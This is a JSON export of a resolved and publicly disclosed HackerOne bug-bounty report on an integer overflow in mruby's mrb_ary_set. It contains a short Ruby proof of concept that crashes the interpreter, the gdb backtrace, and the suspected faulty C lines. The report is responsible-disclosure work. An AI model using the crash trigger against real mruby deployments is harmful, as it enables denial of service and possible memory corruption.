{
  "id": 192235,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTIyMzU=",
  "url": "https://hackerone.com/reports/192235",
  "title": "Integer Overflow in mrb_ary_set",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-12-18T16:31:25.215Z",
  "submitted_at": "2016-12-18T16:31:25.215Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tunz",
    "url": "/tunz",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-01-12T03:09:35.290Z",
  "bug_reporter_agreed_on_going_public_at": "2017-01-12T03:09:35.255Z",
  "team_member_agreed_on_going_public_at": "2017-01-11T21:55:48.601Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\nI found a crash in mruby. I frankly couldn't reproduce it in mruby-engine. I think it is because of memory limitation, but I'm not sure.\n\nHere is a PoC (when the size of MRB_INT is 32). \n\n```ruby\nary = Array.new(0)\nary[0x7fffffff] = 1\n```\n\n```\n$ gdb -q --args ./bin/mruby ./test.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby ./test.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) list\n99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)\n100     {\n101       mrb_value nil = mrb_nil_value();\n102\n103       while (size--) {\n104         *ptr++ = nil;\n105       }\n106     }\n107\n108     static void\n(gdb) x/i $pc\n=> 0x4146a8 <ary_fill_with_nil+50>:     mov    QWORD PTR [rcx],rax\n(gdb) i r rcx\nrcx            0x1357000        20279296\n(gdb) bt\n#0  0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x0000000000415ab1 in mrb_ary_set (mrb=0x12d2010, ary=..., n=2147483647, val=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:564\n#2  0x0000000000416266 in mrb_ary_aset (mrb=0x12d2010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:798\n#3  0x000000000043032c in mrb_vm_exec (mrb=0x12d2010, proc=0x12d5210, pc=0x133a020) at /home/tunz/working/mruby/mruby/src/vm.c:1171\n#4  0x000000000042e850 in mrb_vm_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x00000000004367f6 in mrb_top_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2487\n#6  0x0000000000446ea4 in mrb_load_exec (mrb=0x12d2010, p=0x132e2c0, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000446f3a in mrb_load_file_cxt (mrb=0x12d2010, f=0x132df00, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024f8 in main (argc=2, argv=0x7fff6f302128)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n```\n\nI think the root cause of this bug is the following line:\n```C\n 548 MRB_API void\n 549 mrb_ary_set(mrb_state *mrb, mrb_value ary, mrb_int n, mrb_value val)\n 550 {\n...\n 562     if (a->aux.capa <= n)\n 563       ary_expand_capa(mrb, a, n + 1); // <- n + 1 can be overflowed?\n 564     ary_fill_with_nil(a->ptr + a->len, n + 1 - a->len);\n 565     a->len = n + 1;\n 566   }\n```",
  "bounty_amount": "100.0",
  "formatted_bounty": "$100",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-02-10T21:55:48.645Z",
  "allow_singular_disclosure_after": -221063693.78048033,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "eveeez",
    "japz",
    "spetr0x"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
